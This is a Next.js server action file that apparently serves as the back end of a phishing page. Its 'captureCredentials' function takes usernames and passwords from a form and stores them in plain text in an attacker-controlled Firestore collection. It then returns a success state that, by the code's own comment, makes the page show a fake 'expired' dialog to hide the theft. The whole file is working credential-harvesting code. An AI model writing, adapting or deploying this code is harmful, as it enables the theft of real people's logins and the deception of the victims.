'use server';

import * as admin from 'firebase-admin';

// Initialize Firebase Admin SDK
// This needs the FIREBASE_SERVICE_ACCOUNT environment variable to be set
if (!admin.apps.length) {
  try {
    const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;
    if (!serviceAccountString) {
      throw new Error('FIREBASE_SERVICE_ACCOUNT environment variable is not set.');
    }
    const serviceAccount = JSON.parse(serviceAccountString);

    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
    });
  } catch (error: any) {
    console.error('Failed to initialize Firebase Admin SDK:', error.message);
  }
}

const firestore = admin.firestore();

// Server action to capture credentials
export async function captureCredentials(prevState: any, formData: FormData) {
  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  console.log('Capturing credentials for:', username);

  if (!username || !password) {
    console.log('Submission failed: Missing username or password.');
    return { success: false, message: 'Username and password are required.' };
  }

  // Ensure the Admin SDK was initialized before proceeding
  if (!admin.apps.length) {
    const errorMessage = 'Server configuration error. Unable to connect to the database.';
    console.error(errorMessage);
    return {
      success: false,
      message: errorMessage,
    };
  }

  try {
    const credentialsCollection = firestore.collection('credentials');

    await credentialsCollection.add({
      username,
      password,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    });
    
    console.log('Successfully saved credentials to Firestore using Admin SDK.');
    // This is the state we return on success. The client will show the "expired" dialog.
    return { success: true, message: 'Submission successful.' };

  } catch (error: any) {
    console.error('Error saving credentials to Firestore with Admin SDK:', error);
    // Return a specific error message for the client
    return {
      success: false,
      message: 'Failed to save credentials. Please check server logs and Firestore rules.',
    };
  }
}
